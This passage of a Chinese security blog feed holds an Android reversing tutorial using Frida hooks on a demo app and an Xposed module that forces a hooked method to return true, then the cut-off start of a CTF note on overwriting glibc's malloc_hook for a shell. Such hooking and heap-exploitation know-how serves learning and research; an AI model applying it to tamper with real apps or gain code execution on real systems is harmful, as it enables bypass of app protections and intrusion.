class="line">	  <span class="keyword">case</span> <span class="number">2131230724</span>: &#123;</span><br><span class="line">	      Toast.makeText(<span class="keyword">this</span>.getApplication(), Utils.test(), <span class="number">1</span>).show();</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中五个Button分别对应了如下五种函数类型。其Java代码及JavaScript注入脚本如下：</p>
<p><strong>Button 1:普通方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getCalc</span><span class="params">(<span class="keyword">int</span> arg1, <span class="keyword">int</span> arg2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg1 + arg2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>👇</strong></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="comment">//通过Java.use()找到需要hook的java类为变量初始化</span></span><br><span class="line">    <span class="keyword">var</span> utils = Java.use(<span class="string">&#x27;com.frida.test.Utils&#x27;</span>);</span><br><span class="line">		<span class="comment">//为util类中的getCalc方法编写hook脚本：参数为a,b</span></span><br><span class="line">    utils.getCalc.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">			<span class="comment">//log方式输出</span></span><br><span class="line">	    <span class="built_in">console</span>.log(<span class="string">&quot;Hook Start...&quot;</span>);</span><br><span class="line">			<span class="comment">//终端方式输出，分别输出Java层中给getCalc函数传入的两个参数</span></span><br><span class="line">			send(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">	    send(<span class="built_in">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">			send(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">			<span class="keyword">var</span> num=<span class="built_in">arguments</span>[<span class="number">0</span>]+<span class="built_in">arguments</span>[<span class="number">1</span>];</span><br><span class="line">			send(<span class="string">&quot;返回值:&quot;</span>);</span><br><span class="line">			send(num);</span><br><span class="line">	    <span class="built_in">console</span>.log(<span class="built_in">this</span>.getCalc(<span class="built_in">arguments</span>[<span class="number">0</span>],<span class="built_in">arguments</span>[<span class="number">1</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><strong>Button 2:构造方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Money</span><span class="params">(<span class="keyword">int</span> arg1, String arg2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    <span class="keyword">this</span>.num = arg1;</span><br><span class="line">    <span class="keyword">this</span>.name = arg2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>👇</strong></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> money = Java.use(<span class="string">&#x27;com.frida.test.Money&#x27;</span>);</span><br><span class="line">		<span class="comment">//&quot;$init&quot;表示money类的构造函数</span></span><br><span class="line">    money.$init.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">	    <span class="built_in">console</span>.log(<span class="string">&quot;Hook Start...&quot;</span>);</span><br><span class="line">			send(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">			send(<span class="built_in">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">	    send(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">			<span class="comment">//原传入参数为:100,&quot;RMB&quot;</span></span><br><span class="line">			<span class="keyword">return</span> <span class="built_in">this</span>.$init(<span class="number">10000</span>, <span class="string">&quot;Dollor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><strong>Button 3:重载方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">test</span><span class="params">(<span class="keyword">int</span> arg2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Test string 2:&quot;</span> + arg2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;This is a test string&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>👇</strong></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = Java.use(<span class="string">&#x27;com.frida.test.Utils&#x27;</span>);</span><br><span class="line">		<span class="comment">//绑定参数类型为(int)的test重载函数</span></span><br><span class="line">    utils.test.overload(<span class="string">&quot;int&quot;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">	    <span class="built_in">console</span>.log(<span class="string">&quot;Hook Start...&quot;</span>);</span><br><span class="line">			send(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">	    send(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;3.1415926&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><strong>Button4、5</strong>在java层中调用了相同的函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;This is a test string&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是通过注入不同的Javascrip脚本实现如下的不同功能。</p>
<p><strong>构造对象参数</strong></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="comment">//此处构造两个新对象</span></span><br><span class="line">	<span class="keyword">var</span> utils = Java.use(<span class="string">&#x27;com.frida.test.Utils&#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> money = Java.use(<span class="string">&#x27;com.frida.test.Money&#x27;</span>);</span><br><span class="line">	<span class="comment">//test函数作为载体</span></span><br><span class="line">  utils.test.overload().implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    send(<span class="string">&quot;Hook Start...&quot;</span>);</span><br><span class="line">		<span class="comment">//劫持程序执行新对象的构造函数</span></span><br><span class="line">		<span class="keyword">var</span> mon = money.$new(<span class="number">2000</span>,<span class="string">&#x27;港币&#x27;</span>);</span><br><span class="line">		send(mon.getInfo());</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">this</span>.test(<span class="number">800</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><strong>修改对象属性</strong></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> utils = Java.use(<span class="string">&#x27;com.frida.test.Utils&#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> money = Java.use(<span class="string">&#x27;com.frida.test.Money&#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> <span class="class"><span class="keyword">class</span> </span>= Java.use(<span class="string">&#x27;java.lang.Class&#x27;</span>);</span><br><span class="line">  utils.test.overload().implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	  send(<span class="string">&quot;Hook Start...&quot;</span>);</span><br><span class="line">		<span class="keyword">var</span> mon = money.$new(<span class="number">200</span>,<span class="string">&#x27;港币&#x27;</span>);</span><br><span class="line">		send(mon.getInfo());</span><br><span class="line">		<span class="comment">//将变量绑定为money对象的num属性</span></span><br><span class="line">		<span class="keyword">var</span> numid= Java.cast(mon.getClass(),<span class="class"><span class="keyword">class</span>).<span class="title">getDeclaredField</span>(&#x27;<span class="title">num</span>&#x27;)</span>;</span><br><span class="line">		<span class="comment">//将变量设为可修改</span></span><br><span class="line">		numid.setAccessible(<span class="literal">true</span>);</span><br><span class="line">	  send(numid.get(mon));</span><br><span class="line">		<span class="comment">//修改</span></span><br><span class="line">	  numid.setInt(mon, <span class="number">1000</span>);</span><br><span class="line">	  send(mon.getInfo());</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">this</span>.test(<span class="number">800</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上述JavaScript脚本均需要插入到python代码中以运行使用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">jscode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">此处插入js代码，用三引号包围</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span>(<span class="params">message, data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;com.frida.test&#x27;</span>)</span><br><span class="line">script= process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<h2 id="Native层"><a href="#Native层" class="headerlink" title="Native层"></a>Native层</h2><p>so层代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall Java_com_example_fridaso_FridaSoDefine_FridaSo(<span class="built_in">int</span> a1, <span class="built_in">int</span> a2, <span class="built_in">int</span> a3, <span class="built_in">int</span> a4，<span class="built_in">int</span> a5)</span><br><span class="line">&#123;</span><br><span class="line">	switch(a5):</span><br><span class="line">		case <span class="number">1</span>:</span><br><span class="line">		  <span class="keyword">return</span> a4 + a3;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		case <span class="number">1</span>:</span><br><span class="line">		  <span class="keyword">return</span> a3 - a4;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		case <span class="number">1</span>:</span><br><span class="line">		  <span class="keyword">return</span> a4 * a3;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		case <span class="number">1</span>:</span><br><span class="line">		  <span class="keyword">return</span> a3 / a4;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		default:</span><br><span class="line">		  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Javascript脚本：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">//setImmediate包围，可防止超时报错</span></span><br><span class="line">setImmediate(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    send(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//遍历模块找基址</span></span><br><span class="line">    Process.enumerateModules(&#123;</span><br><span class="line">        onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">exp</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (exp.name == <span class="string">&#x27;libdemo.so&#x27;</span>) &#123;</span><br><span class="line">                send(<span class="string">&#x27;enumerateModules find&#x27;</span>);</span><br><span class="line">                send(exp.name + <span class="string">&quot;|&quot;</span> + exp.base + <span class="string">&quot;|&quot;</span> + exp.size + <span class="string">&quot;|&quot;</span> + exp.path);</span><br><span class="line">                send(exp);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;stop&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            send(<span class="string">&#x27;enumerateModules stop&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//hook导出函数</span></span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">exports</span> = Module.enumerateExportsSync(<span class="string">&quot;libdemo.so&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="built_in">exports</span>.length;i++)&#123;</span><br><span class="line">        send(<span class="string">&quot;name:&quot;</span>+<span class="built_in">exports</span>[i].name+<span class="string">&quot;  address:&quot;</span>+<span class="built_in">exports</span>[i].address);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//通过模块名直接查找基址</span></span><br><span class="line">    <span class="keyword">var</span> baseSOFile = Module.findBaseAddress(<span class="string">&quot;libdemo.so&quot;</span>);</span><br><span class="line">    <span class="comment">//&quot;Interceptor.attach&quot;获取进程，此处若为thumb汇编则需要改成0x1270+1</span></span><br><span class="line">    Interceptor.attach(baseSOFile.add(<span class="number">0x00001270</span>),&#123;</span><br><span class="line">        onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">						<span class="comment">//参数1为JNIEnv *</span></span><br><span class="line">            <span class="built_in">console</span>.log(Memory.readCString(args[<span class="number">0</span>]));</span><br><span class="line">						<span class="comment">//参数2为jclass</span></span><br><span class="line">            <span class="built_in">console</span>.log(Memory.readUtf16String(args[<span class="number">3</span>]));</span><br><span class="line">            <span class="built_in">console</span>.log(args[<span class="number">2</span>]);</span><br><span class="line">            <span class="built_in">console</span>.log(args[<span class="number">3</span>]);</span><br><span class="line">            <span class="built_in">console</span>.log(args[<span class="number">4</span>]);</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//通过包名类名函数名找到基址获取程序进程</span></span><br><span class="line">		Interceptor.attach(Module.findExportByName(<span class="string">&quot;libfridaso.so&quot;</span>,<span class="string">&quot;Java_com_example_fridaso_FridaSoDefine_FridaSo&quot;</span>),&#123;</span><br><span class="line">        <span class="comment">//onEnter在函数执行前执行，args是函参</span></span><br><span class="line">				onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">            send(<span class="string">&quot;Hook start&quot;</span>);</span><br><span class="line">            send(<span class="string">&quot;args[2]=&quot;</span> + args[<span class="number">2</span>]);</span><br><span class="line">            send(<span class="string">&quot;args[3]=&quot;</span> + args[<span class="number">3</span>]);</span><br><span class="line">        &#125;,</span><br><span class="line">				<span class="comment">//onLeave在函数执行结束后执行，retval是返回值</span></span><br><span class="line">        onLeave: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>)</span>&#123;</span><br><span class="line">            send(<span class="string">&quot;return:&quot;</span>+retval); </span><br><span class="line">            retval.replace(<span class="number">0</span>); <span class="comment">//替换返回值</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h1 id="Xposed-Framework"><a href="#Xposed-Framework" class="headerlink" title="Xposed Framework"></a>Xposed Framework</h1><h2 id="原理简述"><a href="#原理简述" class="headerlink" title="原理简述"></a><strong>原理简述</strong></h2><p>Xposed框架通过安装模块来实现需要的功能。所谓模块是指一类特殊的app，此类app通过修改Zygote来实现一些设计内核以及高权限的功能，由Xposed管理。其中，Zygote是Android的内核，每个APP均由Zygote fork出的虚拟机来运行，而Xposed框架中的模块可以重写并替换Zygote的执行文件app_process，即可从一开始就修改整个进程。</p>
<p>详细原理参见<a href="https://www.freebuf.com/articles/terminal/56453.html">链接</a>。</p>
<h2 id="使用过程"><a href="#使用过程" class="headerlink" title="使用过程"></a>使用过程</h2><h3 id="手机端"><a href="#手机端" class="headerlink" title="手机端"></a>手机端</h3><p>1.手机root后直接安装<a href="http://xposed.appkg.com/nav">xpose installer</a> ，需要注意android5.0以下和以上安装的是不同版本。</p>
<p>2.重启后提示安装完成</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6LUZLt.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LUZLt.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<h3 id="PC端"><a href="#PC端" class="headerlink" title="PC端"></a>PC端</h3><p>1.在Android Studio中新建空白工程(No Activity)，将库文件拖入libs目录。</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6LUpdK.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LUpdK.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>2.在Java项目的第一个包里新建class。</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6LUPiD.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LUPiD.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xp;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hook</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;包名&quot;</span>))&#123;</span><br><span class="line">      XposedHelpers.findAndHookMethod(<span class="string">&quot;包名.类名&quot;</span>, loadPackageParam.classLoader,</span><br><span class="line">        <span class="string">&quot;hook函数名&quot;</span>, String.class, String.class, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">					<span class="comment">//执行被hook函数前运行</span></span><br><span class="line">          <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>.beforeHookedMethod(param);</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;Arg1: &quot;</span> + param.args[<span class="number">0</span>]);</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;Arg2: &quot;</span> + param.args[<span class="number">1</span>]);</span><br><span class="line">						<span class="comment">//XposedBridge.log(&quot;Arg3: &quot; + param.args[2]);</span></span><br><span class="line"></span><br><span class="line">						<span class="comment">//打印堆栈信息</span></span><br><span class="line">            StackTraceElement[] wodelogs = <span class="keyword">new</span> Throwable(<span class="string">&quot;wodelog&quot;</span>).getStackTrace();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;wodelogs.length;i++)&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;查看堆栈:&quot;</span>+wodelogs[i].toString());</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">					<span class="comment">//执行被hook函数后运行(返回前)</span></span><br><span class="line">          <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>.afterHookedMethod(param);</span><br><span class="line">						XposedBridge.log(<span class="string">&quot;Result before modified: &quot;</span> + param);</span><br><span class="line">            param.setResult(<span class="keyword">true</span>); <span class="comment">// 函数返回值修改为true</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.创建assets文件夹，新建文件xposed_init，写入“包名+类名”，模块从此处寻找程序入口。</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6LU9IO.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LU9IO.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>4.修改清单文件AndroidManifest.xml，在<application>标签之间添加如下代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 添加标识 --&gt;</span></span><br><span class="line"> &lt;meta-data</span><br><span class="line">     android:name=&quot;xposedmodule&quot;</span><br><span class="line">     android:value=&quot;true&quot;/&gt;</span><br><span class="line"></span><br><span class="line"> <span class="comment">&lt;!-- 载入Hook模块之后显示的信息 --&gt;</span></span><br><span class="line"> &lt;meta-data</span><br><span class="line">     android:name=&quot;xposeddescription&quot;</span><br><span class="line">     android:value=&quot;Xposed Proxy For HOOK&quot;/&gt;</span><br><span class="line"></span><br><span class="line"> <span class="comment">&lt;!-- 规定jar包的版本信息 --&gt;</span></span><br><span class="line"> &lt;meta-data</span><br><span class="line">     android:name=&quot;xposedminversion&quot;</span><br><span class="line">     android:value=&quot;54&quot;/&gt;</span><br></pre></td></tr></table></figure>

<p>👇</p>
<img src="https://z3.ax1x.com/2021/03/25/6LUiJe.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LUiJe.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" />

<p>5.修改build.gradle(app)，添加sourceSets段落，修改fileTree为compileOnly</p>
<img src="https://z3.ax1x.com/2021/03/25/6LUFRH.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LUFRH.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:67%;" />

<p>6.构造运行，在虚拟机中查看，在installer中勾选模块</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6LUkzd.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LUkzd.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>7.重启后在installer中查看日志，安装完成</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6LUEQA.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LUEQA.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
]]></content>
      <tags>
        <tag>AndroidRe</tag>
        <tag>Summary</tag>
      </tags>
  </entry>
  <entry>
    <title>Malloc_Hook小记</title>
    <url>/2020/03/01/Malloc-Hook/</url>
    <content><![CDATA[<p>​        malloc_hook的介绍以及用堆进行malloc_hook攻击。<span id="more"></span></p>
<p>​        昨天的babyheap算是碰上的第一个malloc_hook利用，而且看这么简单的偏移都看不明白，还是记一下吧。</p>
<h2 id="0x00-关于malloc-hook"><a href="#0x00-关于malloc-hook" class="headerlink" title="0x00 关于malloc_hook"></a>0x00 关于malloc_hook</h2><p>​        malloc_hook是一个位于main_arena附近的函数指针。</p>
<p>​        当系统调用malloc，free函数时，会对此指针进行检查，如果指针非空则跳转到该地址并执行。所以，将shellcode或者system(“/bin/sh”)的地址写入到malloc_hook中再想办法调用是一个比较常见的getshell思路。</p>
<h2 id="0x01-malloc-hook位置"><a href="#0x01-malloc-hook位置" class="headerlink" title="0x01 malloc_hook位置"></a>0x01 malloc_hook位置</h2><p>​        malloc_hook位于main_arena(如果不知道main_arena地址可以直接使用命令 x/20xg &amp;main_arena 查看内存和地址)往上，offset = 0x10:</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/malloc/1.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/malloc/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 67%;" />

<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/malloc/2.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/malloc/2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 67%;" />

<p>​        一般来说malloc_hook为空，但是有一次偶然发现了malloc_hook未被攻击却有值，后来才发现是程序还没有初始化。</p>
<h2 id="0x03-malloc-hook攻击"><a href="#0x03-malloc-hook攻击" class="headerlink" title="0x03 malloc_hook攻击"></a>0x03 malloc_hook攻击</h2><h3 id="A-如何写入"><a href="#A-如何写入" class="headerlink" title="A.如何写入"></a>A.如何写入</h3><p>​        如果程序中存在任意写的漏洞，则用户可以很容易的进行malloc_hook攻击。这里用堆做一个实例（实际上也通常用堆）。就fastbin attack来说，如果我们改写chunk的fd，使其指向malloc_hook上方一定偏移处，就可以填充并写入malloc_hook。所以问题的关键就是我们要在哪儿创建堆，创建多大的堆，如何填充数据。</p>
